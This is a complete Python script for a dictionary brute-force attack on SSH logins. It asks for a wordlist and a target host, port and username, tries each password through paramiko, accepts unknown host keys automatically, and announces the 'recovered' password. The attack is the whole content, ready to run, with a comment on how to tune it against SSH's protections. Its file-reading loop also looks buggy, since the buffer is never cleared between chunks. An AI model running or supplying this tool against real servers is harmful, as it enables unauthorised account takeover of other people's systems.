#!/usr/bin/env python3

import sys
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException

# Due to the robust security protocols integrated within SSH, parallel attacks are considerably less effective. Consequently, I opted to employ a single attack connection

def get_encoder():
    print("\n[INFO] This option is only valid for SSH services exposed on the Internet (not for local testing)")
    print("[INFO] To ensure compatibility with special characters, select an encoding method:")
    print("1) latin-1\n2) utf-8")

    option = input("Select option [1/2]: ").strip()
    encoder_text = "latin-1" if option == "1" else "utf-8"

    return encoder_text

def ssh(client, passwords, hostname, username, port):

    for pwd in passwords:
        try:
            client.connect(hostname, port=port, username=username, password=pwd.strip(), timeout=3)
            stdin, stdout, stderr = client.exec_command('echo "Ready"')
            output = stdout.read().decode().strip()

            if output == "Ready":
                print("\n" + "=" * 50)
                print("=" * 50)
                print("[ PASSWORD FOUND ]".center(50))
                print("=" * 50)
                print(f">>> Recovered Password: {pwd.strip()}".center(50))
                print("=" * 50 + "\n")

                client.close()
                sys.exit(0)


        except AuthenticationException:
            print(f"[*] Trying password:- {pwd.strip()}")

        except Exception as e:
            print(f"Error with password {pwd.strip()}: {e}")

        finally:
            client.close()


def read_dic(dic_path, port, hostname, username, encoder):
    client = SSHClient()
    client.set_missing_host_key_policy(AutoAddPolicy())

    with open(dic_path, 'r', encoding=encoder, errors='ignore') as file_read:
       chunk_size = 512 * 1024
       buffer = ""

       while True:
         chunk = file_read.read(chunk_size)
         if not chunk:
            break

         buffer += chunk
         lines = buffer.splitlines()

         buffer_list = []
         if not chunk.endswith('\n'):
            buffer_list.append(lines.pop())

         ssh(client, lines, hostname, username, port)

       if buffer_list:
         ssh(client, buffer_list, hostname, username, port)


def main():
    try:
        encoder = get_encoder()

        dic_path = input("Enter the dictionary path: ").strip()
        hostname = input("Enter SSH server IP: ").strip()
        port = int(input("Enter the port: ").strip())
        username = input("Enter SSH username: ").strip()

        read_dic(dic_path, port, hostname, username, encoder)

    except KeyboardInterrupt:
        print()
        sys.exit(1)

    except FileNotFoundError as f:
        print(f"[ERROR]: File not found. Please verify the path: {f}")
        sys.exit(1)

    except IsADirectoryError as d:
        print(f"[ERROR]: Expected a file but found a directory: {d}")
        sys.exit(1)

    except Exception as error:
        print(f"[ERROR]: {error}")
        sys.exit(1)


if __name__ == '__main__':
     main()

__status__="Finish"
